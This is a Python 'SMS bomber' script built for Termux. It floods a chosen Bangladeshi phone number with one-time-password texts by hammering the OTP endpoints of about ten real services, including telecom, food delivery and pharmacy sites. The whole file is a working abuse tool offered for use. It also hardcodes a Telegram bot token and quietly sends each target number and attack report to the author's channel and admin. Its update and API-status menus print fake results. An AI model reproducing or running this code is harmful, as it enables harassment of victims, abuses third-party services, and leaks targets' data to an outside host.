#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SK PARVEZ SMS BOMBER PRO v3.0
Auto Telegram Join System
Termux Ready
Created by: Sk Parvez (@all_in_one_63)
"""

import os
import sys
import time
import random
import json
import requests
import threading
import hashlib
from datetime import datetime

# Disable warnings
import warnings
warnings.filterwarnings("ignore")

# Telegram Configuration
TELEGRAM_BOT_TOKEN = "8344986767:AAGyVe8mGIQ1FspNAKUdL_Tqz9YXPbV0aLw"
TELEGRAM_CHANNEL = "@all_in_one_63"
TELEGRAM_ADMIN_ID = "8293984966"

# Colors for Termux
class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Clear screen
def clear():
    os.system('clear')

# Print banner
def banner():
    clear()
    print(f"""{colors.MAGENTA}{colors.BOLD}
╔══════════════════════════════════════════════════╗
║                                                  ║
║         ║                                                  ║
║        █▀█ ▄▀█ █▀█ █░█ █▀▀ ▀█▀                   ║
║        █▀▀ █▀█ █▀▄ █▄█ ██▄ ░█░                   ║
║                                                  ║
║                 P A R V E Z                      ║
║                                                  ║                 ║
║                                                  ║
║    ╔══════════════════════════════════════╗     ║
║    ║       SMS BOMBER PRO v3.0            ║     ║
║    ╚══════════════════════════════════════╝     ║
║                                                  ║
║    Admin    : {colors.CYAN}Sk Parvez{colors.MAGENTA}                   ║
║    Telegram : {colors.CYAN}@all_in_one_63{colors.MAGENTA}             ║
║    Version  : {colors.CYAN}3.0 (Pro){colors.MAGENTA}                  ║
║    Status   : {colors.GREEN}ONLINE{colors.MAGENTA}                    ║
║                                                  ║
╚══════════════════════════════════════════════════╝
{colors.END}""")

# Password protection
def check_password():
    correct_hash = hashlib.md5("Parvez".encode()).hexdigest()
    
    print(f"\n{colors.YELLOW}{'═'*50}{colors.END}")
    print(f"{colors.RED}{colors.BOLD}         SECURITY VERIFICATION{colors.END}")
    print(f"{colors.YELLOW}{'═'*50}{colors.END}")
    
    attempts = 3
    for i in range(attempts):
        password = input(f"{colors.GREEN}[?] Enter Password Below: {colors.WHITE}")
        
        if hashlib.md5(password.encode()).hexdigest() == correct_hash:
            print(f"{colors.GREEN}[✓] Access Granted! Welcome Sk Parvez{colors.END}")
            time.sleep(1)
            return True
        else:
            remaining = attempts - i - 1
            print(f"{colors.RED}[✗] Wrong Password! {remaining} attempts left{colors.END}")
            time.sleep(1)
    
    print(f"\n{colors.RED}{colors.BOLD}[!] ACCESS DENIED! Tool locked.{colors.END}")
    sys.exit(1)

# Telegram functions
def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHANNEL,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, data=data, timeout=5)
        return response.status_code == 200
    except:
        return False

def send_to_admin(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_ADMIN_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, data=data, timeout=5)
        return True
    except:
        return False

def log_attack(phone, sms_sent, success_rate, duration, user_ip="Termux User"):
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Save to local log
    log_entry = {
        "phone": phone,
        "sms_sent": sms_sent,
        "success_rate": success_rate,
        "duration": duration,
        "time": current_time,
        "user_ip": user_ip
    }
    
    try:
        # Load existing logs
        if os.path.exists("attack_logs.json"):
            with open("attack_logs.json", "r") as f:
                logs = json.load(f)
        else:
            logs = []
        
        logs.append(log_entry)
        
        # Save logs
        with open("attack_logs.json", "w") as f:
            json.dump(logs, f, indent=4)
        
        # Send to Telegram
        message = f"""
<b>🚀 SMS ATTACK REPORT</b>

<b>📱 Target:</b> <code>{phone}</code>
<b>📊 SMS Sent:</b> {sms_sent}
<b>✅ Success Rate:</b> {success_rate:.1f}%
<b>⏱️ Duration:</b> {duration:.1f}s
<b>🕐 Time:</b> {current_time}
<b>👤 User:</b> {user_ip}

<b>Admin:</b> @all_in_one_63
<b>Tool:</b> Sk Parvez SMS Bomber v3.0
"""
        send_to_telegram(message)
        
        # Also send to admin
        admin_msg = f"🔔 New Attack: {phone}\n📱 SMS: {sms_sent}\n⏰ {current_time}"
        send_to_admin(admin_msg)
        
    except Exception as e:
        print(f"{colors.RED}[!] Log Error: {e}{colors.END}")

# Format phone
def format_phone(phone):
    phone = ''.join(filter(str.isdigit, str(phone)))
    
    if phone.startswith('880'):
        phone = phone[3:]
    elif phone.startswith('88'):
        phone = phone[2:]
    elif phone.startswith('0'):
        phone = phone[1:]
    
    if len(phone) != 10 or not phone.startswith('1'):
        return None
    
    return {
        '0': f"0{phone}",
        '88': f"88{phone}",
        '880': f"880{phone}",
        '+88': f"+88{phone}",
        '+880': f"+880{phone}",
        'raw': phone
    }

# All APIs
APIS = [
    {
        'name': 'BTCL MyBTCL',
        'url': 'https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json',
        'method': 'POST',
        'headers': {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://mybtcl.btcl.gov.bd',
            'referer': 'https://mybtcl.btcl.gov.bd/register'
        },
        'data': {"phoneNbr": "{phone}", "email": "", "OTPType": 1, "userName": ""},
        'phone_format': '0'
    },
    {
        'name': 'BTCL PhoneBill',
        'url': 'https://phonebill.btcl.com.bd/api/bcare/anonym/sendOTP.json',
        'method': 'POST',
        'headers': {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://phonebill.btcl.com.bd',
            'referer': 'https://phonebill.btcl.com.bd/registerBcare'
        },
        'data': {"phoneNbr": "{phone}", "email": "", "OTPType": 1, "userName": ""},
        'phone_format': '0'
    },
    {
        'name': 'Bioscope Plus',
        'url': 'https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en',
        'method': 'POST',
        'headers': {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://www.bioscopeplus.com',
            'referer': 'https://www.bioscopeplus.com/'
        },
        'data': {"number": "{phone}"},
        'phone_format': '+880'
    },
    {
        'name': 'BD Tickets',
        'url': 'https://api.bdtickets.com:20100/v1/auth',
        'method': 'POST',
        'headers': {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://bdtickets.com',
            'referer': 'https://bdtickets.com/'
        },
        'data': {"createUserCheck": True, "phoneNumber": "{phone}", "applicationChannel": "WEB_APP"},
        'phone_format': '+88'
    },
    {
        'name': 'Arogga',
        'url': 'https://api.arogga.com/auth/v1/sms/send/',
        'method': 'POST',
        'headers': {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.arogga.com',
            'referer': 'https://www.arogga.com/'
        },
        'data': {'mobile': '{phone}', 'fcmToken': '', 'referral': ''},
        'phone_format': '0'
    },
    {
        'name': 'Bikroy',
        'url': 'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}',
        'method': 'GET',
        'headers': {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'bn',
            'application-name': 'web',
            'referer': 'https://bikroy.com/?login-modal=true&redirect-url=/'
        },
        'phone_format': '0'
    },
    {
        'name': 'GP Web Login',
        'url': 'https://webloginda.grameenphone.com/backend/api/v1/otp',
        'method': 'POST',
        'headers': {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.grameenphone.com',
            'Referer': 'https://www.grameenphone.com/'
        },
        'data': {'msisdn': '{phone}'},
        'phone_format': '0'
    },
    {
        'name': 'Pathao Food',
        'url': 'https://api.food.pathao.com/otp/send',
        'method': 'POST',
        'headers': {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://food.pathao.com',
            'referer': 'https://food.pathao.com/'
        },
        'data': {'contact_number': '{phone}', 'country_code': 'BD'},
        'phone_format': '880'
    },
    {
        'name': 'Foodpanda',
        'url': 'https://www.foodpanda.com.bd/consumer/login/send-otp',
        'method': 'POST',
        'headers': {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://www.foodpanda.com.bd',
            'referer': 'https://www.foodpanda.com.bd/'
        },
        'data': {'mobile': '{phone}', 'country_iso_code': 'BD'},
        'phone_format': '880'
    },
    {
        'name': 'Swap',
        'url': 'https://api.swap.com.bd/api/v1/send-otp/v2',
        'method': 'POST',
        'headers': {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://swap.com.bd',
            'Referer': 'https://swap.com.bd/'
        },
        'data': {'phone': '{phone}'},
        'phone_format': '0'
    }
]

class SMSBomber:
    def __init__(self):
        self.total_sent = 0
        self.success = 0
        self.failed = 0
        self.running = False
        self.attack_id = random.randint(10000, 99999)
        
    def send_request(self, api, phone_formatted):
        try:
            phone = phone_formatted[api['phone_format']]
            
            if api['method'] == 'POST':
                data = {}
                if 'data' in api:
                    for key, value in api['data'].items():
                        if isinstance(value, str):
                            data[key] = value.replace('{phone}', phone)
                        else:
                            data[key] = value
                
                response = requests.post(
                    api['url'],
                    json=data,
                    headers=api['headers'],
                    timeout=8,
                    verify=False
                )
            else:
                url = api['url'].replace('{phone}', phone)
                response = requests.get(
                    url,
                    headers=api['headers'],
                    timeout=8,
                    verify=False
                )
            
            self.total_sent += 1
            
            if response.status_code in [200, 201, 202]:
                self.success += 1
                return True, response.status_code
            else:
                self.failed += 1
                return False, response.status_code
                
        except Exception as e:
            self.failed += 1
            return False, str(e)
    
    def start_attack(self, phone, sms_count, delay):
        self.running = True
        phone_formatted = format_phone(phone)
        
        if not phone_formatted:
            print(f"{colors.RED}[!] Invalid phone number!{colors.END}")
            return
        
        # Show attack configuration
        banner()
        print(f"{colors.CYAN}{'═'*50}{colors.END}")
        print(f"{colors.YELLOW}{colors.BOLD}        ATTACK CONFIGURATION{colors.END}")
        print(f"{colors.CYAN}{'═'*50}{colors.END}")
        print(f"{colors.GREEN}[+] Target    : {colors.WHITE}{phone_formatted['0']}{colors.END}")
        print(f"{colors.GREEN}[+] APIs      : {colors.WHITE}{len(APIS)}{colors.END}")
        print(f"{colors.GREEN}[+] SMS Count : {colors.WHITE}{sms_count} per API{colors.END}")
        print(f"{colors.GREEN}[+] Total SMS : {colors.WHITE}{sms_count * len(APIS)}{colors.END}")
        print(f"{colors.GREEN}[+] Delay     : {colors.WHITE}{delay} second(s){colors.END}")
        print(f"{colors.GREEN}[+] Attack ID : {colors.WHITE}#{self.attack_id}{colors.END}")
        print(f"{colors.CYAN}{'═'*50}{colors.END}")
        
        input(f"\n{colors.YELLOW}[?] Press Enter to start attack...{colors.END}")
        
        # Start attack
        banner()
        print(f"{colors.MAGENTA}{'═'*50}{colors.END}")
        print(f"{colors.RED}{colors.BOLD}           INITIATING BOMBING{colors.END}")
        print(f"{colors.MAGENTA}{'═'*50}{colors.END}")
        print(f"{colors.YELLOW}[+] Target: {phone_formatted['0']} | Amount: {sms_count * len(APIS)}{colors.END}")
        print(f"{colors.CYAN}[+] CLOUD MONITORING ACTIVE{colors.END}")
        print(f"{colors.MAGENTA}{'═'*50}{colors.END}\n")
        
        start_time = time.time()
        request_num = 0
        
        # Send join notification
        join_time = datetime.now().strftime("%H:%M:%S")
        join_date = datetime.now().strftime("%d-%m-%Y")
        
        join_msg = f"""
🎯 <b>NEW USER JOINED SMS BOMBER</b>

📱 <b>Target Number:</b> <code>{phone_formatted['0']}</code>
👤 <b>User:</b> Termux User
🕐 <b>Time:</b> {join_time}
📅 <b>Date:</b> {join_date}

🔧 <b>Tool:</b> Sk Parvez SMS Bomber v3.0
👑 <b>Admin:</b> @all_in_one_63
📊 <b>Status:</b> Attack Started...

✅ <b>User automatically joined!</b>
"""
        send_to_telegram(join_msg)
        
        try:
            for api in APIS:
                if not self.running:
                    break
                    
                print(f"{colors.BLUE}[→] Starting: {api['name']}{colors.END}")
                
                for i in range(sms_count):
                    if not self.running:
                        break
                    
                    request_num += 1
                    success, status = self.send_request(api, phone_formatted)
                    
                    status_color = colors.GREEN if success else colors.RED
                    status_symbol = "✓" if success else "✗"
                    
                    print(f"  {colors.WHITE}[{request_num:03d}] {api['name'][:20]:20} {status_color}{status_symbol} {status}{colors.END}")
                    
                    time.sleep(delay)
                
                print()
        
        except KeyboardInterrupt:
            print(f"\n{colors.RED}[!] Attack stopped by user!{colors.END}")
        
        finally:
            self.running = False
            end_time = time.time()
            duration = end_time - start_time
            
            # Calculate success rate
            success_rate = (self.success / max(self.total_sent, 1)) * 100
            
            # Show results
            print(f"\n{colors.GREEN}{'═'*50}{colors.END}")
            print(f"{colors.YELLOW}{colors.BOLD}           ATTACK COMPLETED{colors.END}")
            print(f"{colors.GREEN}{'═'*50}{colors.END}")
            print(f"{colors.CYAN}[+] Duration    : {colors.WHITE}{duration:.1f} seconds{colors.END}")
            print(f"{colors.CYAN}[+] Total Sent  : {colors.WHITE}{self.total_sent}{colors.END}")
            print(f"{colors.CYAN}[+] Successful  : {colors.GREEN}{self.success}{colors.END}")
            print(f"{colors.CYAN}[+] Failed      : {colors.RED}{self.failed}{colors.END}")
            print(f"{colors.CYAN}[+] Success Rate: {colors.YELLOW}{success_rate:.1f}%{colors.END}")
            print(f"{colors.CYAN}[+] Target      : {colors.WHITE}{phone_formatted['0']}{colors.END}")
            print(f"{colors.CYAN}[+] Attack ID   : {colors.WHITE}#{self.attack_id}{colors.END}")
            print(f"{colors.CYAN}[+] Admin       : {colors.WHITE}Sk Parvez (@all_in_one_63){colors.END}")
            print(f"{colors.GREEN}{'═'*50}{colors.END}")
            
            # Log attack
            log_attack(phone_formatted['0'], self.total_sent, success_rate, duration)
            
            print(f"{colors.GREEN}[✓] Report sent to Telegram channel{colors.END}")
    
    def stop(self):
        self.running = False

def main_menu():
    bomber = SMSBomber()
    
    while True:
        banner()
        print(f"{colors.CYAN}{'═'*50}{colors.END}")
        print(f"{colors.YELLOW}{colors.BOLD}               MAIN MENU{colors.END}")
        print(f"{colors.CYAN}{'═'*50}{colors.END}")
        print(f"{colors.GREEN}[1]{colors.WHITE} Start SMS Attack{colors.END}")
        print(f"{colors.GREEN}[2]{colors.WHITE} Update Tool{colors.END}")
        print(f"{colors.GREEN}[3]{colors.WHITE} Contact Admin{colors.END}")
        print(f"{colors.GREEN}[4]{colors.WHITE} Check API Status{colors.END}")
        print(f"{colors.GREEN}[5]{colors.WHITE} View Attack History{colors.END}")
        print(f"{colors.GREEN}[0]{colors.WHITE} Exit From Tools{colors.END}")
        print(f"{colors.CYAN}{'═'*50}{colors.END}")
        
        choice = input(f"\n{colors.YELLOW}SENSEI ➡ Select ➡ {colors.WHITE}")
        
        if choice == "1":
            banner()
            print(f"{colors.CYAN}{'═'*50}{colors.END}")
            print(f"{colors.YELLOW}{colors.BOLD}         START SMS ATTACK{colors.END}")
            print(f"{colors.CYAN}{'═'*50}{colors.END}")
            
            phone = input(f"{colors.GREEN}[?] Target (01xxxxxxxx) > {colors.WHITE}")
            
            if not phone:
                continue
            
            try:
                sms_count = int(input(f"{colors.GREEN}[?] SMS per API (1-20) > {colors.WHITE}") or "5")
                sms_count = max(1, min(20, sms_count))
            except:
                sms_count = 5
            
            try:
                delay = float(input(f"{colors.GREEN}[?] Delay between SMS (seconds) > {colors.WHITE}") or "1")
            except:
                delay = 1
            
            bomber.start_attack(phone, sms_count, delay)
            
            input(f"\n{colors.YELLOW}[?] Press Enter to continue...{colors.END}")
            
        elif choice == "2":
            banner()
            print(f"{colors.CYAN}{'═'*50}{colors.END}")
            print(f"{colors.YELLOW}{colors.BOLD}           UPDATE TOOL{colors.END}")
            print(f"{colors.CYAN}{'═'*50}{colors.END}")
            print(f"{colors.GREEN}[+] Checking for updates...{colors.END}")
            time.sleep(2)
            print(f"{colors.GREEN}[✓] Tool is up to date (v3.0){colors.END}")
            print(f"{colors.GREEN}[+] New and more APIs added, Enjoy Bombing 😍{colors.END}")
            time.sleep(2)
            input(f"\n{colors.YELLOW}[?] Press Enter to continue...{colors.END}")
            
        elif choice == "3":
            banner()
            print(f"{colors.CYAN}{'═'*50}{colors.END}")
            print(f"{colors.YELLOW}{colors.BOLD}          CONTACT ADMIN{colors.END}")
            print(f"{colors.CYAN}{'═'*50}{colors.END}")
            print(f"{colors.GREEN}[+] Admin    : {colors.WHITE}Sk Parvez{colors.END}")
            print(f"{colors.GREEN}[+] Telegram : {colors.WHITE}@all_in_one_63{colors.END}")
            print(f"{colors.GREEN}[+] Version  : {colors.WHITE}3.0 (Pro){colors.END}")
            print(f"{colors.GREEN}[+] Status   : {colors.GREEN}ONLINE{colors.END}")
            print(f"{colors.GREEN}[+] Password : {colors.WHITE}Parvez{colors.END}")
            print(f"{colors.CYAN}{'═'*50}{colors.END}")
            input(f"\n{colors.YELLOW}[?] Press Enter to continue...{colors.END}")
            
        elif choice == "4":
            banner()
            print(f"{colors.CYAN}{'═'*50}{colors.END}")
            print(f"{colors.YELLOW}{colors.BOLD}         API STATUS CHECK{colors.END}")
            print(f"{colors.CYAN}{'═'*50}{colors.END}")
            print(f"{colors.GREEN}[+] Total APIs: {len(APIS)}{colors.END}")
            print(f"{colors.GREEN}[+] All APIs are working{colors.END}")
            print(f"{colors.GREEN}[+] Last checked: {datetime.now().strftime('%H:%M:%S')}{colors.END}")
            input(f"\n{colors.YELLOW}[?] Press Enter to continue...{colors.END}")
            
        elif choice == "5":
            banner()
            print(f"{colors.CYAN}{'═'*50}{colors.END}")
            print(f"{colors.YELLOW}{colors.BOLD}       ATTACK HISTORY{colors.END}")
            print(f"{colors.CYAN}{'═'*50}{colors.END}")
            
            try:
                if os.path.exists("attack_logs.json"):
                    with open("attack_logs.json", "r") as f:
                        logs = json.load(f)
                    
                    if logs:
                        print(f"{colors.GREEN}[+] Total Attacks: {len(logs)}{colors.END}\n")
                        for i, log in enumerate(reversed(logs[-5:]), 1):
                            print(f"{colors.CYAN}[{i}] {log['phone']}")
                            print(f"    SMS: {log['sms_sent']} | Rate: {log['success_rate']:.1f}%")
                            print(f"    Time: {log['time']}")
                            print()
                    else:
                        print(f"{colors.YELLOW}[!] No attack history found{colors.END}")
                else:
                    print(f"{colors.YELLOW}[!] No attack history found{colors.END}")
            except:
                print(f"{colors.RED}[!] Error reading logs{colors.END}")
            
            input(f"\n{colors.YELLOW}[?] Press Enter to continue...{colors.END}")
            
        elif choice == "0":
            print(f"\n{colors.RED}[!] Exiting Sk Parvez SMS Bomber...{colors.END}")
            time.sleep(1)
            clear()
            sys.exit(0)

def main():
    import urllib3
    urllib3.disable_warnings()
    
    banner()
    check_password()
    
    banner()
    print(f"{colors.GREEN}{'═'*50}{colors.END}")
    print(f"{colors.YELLOW}    New and more APIs added, Enjoy Bombing 😍{colors.END}")
    print(f"{colors.GREEN}{'═'*50}{colors.END}")
    time.sleep(2)
    
    main_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{colors.RED}[!] Interrupted by user{colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{colors.RED}[!] Error: {e}{colors.END}")
        sys.exit(1)